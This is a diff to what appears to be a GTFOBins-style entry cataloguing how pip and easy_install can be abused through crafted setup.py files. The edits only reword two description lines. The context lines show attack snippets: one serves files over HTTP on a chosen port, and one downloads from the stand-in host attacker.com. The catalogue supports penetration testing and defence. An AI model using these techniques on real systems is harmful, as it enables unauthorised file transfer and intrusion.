@@ -37,7 +37,7 @@ functions:
         ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()' > $TF/setup.py
         easy_install $TF
   download:
-    - description: Fetch a remote file via HTTP GET request. It needs an absolute local file path.
+    - description: Fetch a remote file via HTTP GET request. The file path must be absolute.
       code: |
         export URL=http://attacker.com/file_to_get
         export LFILE=/tmp/file_to_save
@@ -49,7 +49,7 @@ functions:
         r.urlretrieve('$URL', '$LFILE')\"\"\")" > $TF/setup.py
         pip install $TF
   file-write:
-    - description: It needs an absolute local file path.
+    - description: The file path must be absolute.
       code: |
         TF=$(mktemp -d)
         echo "import os;
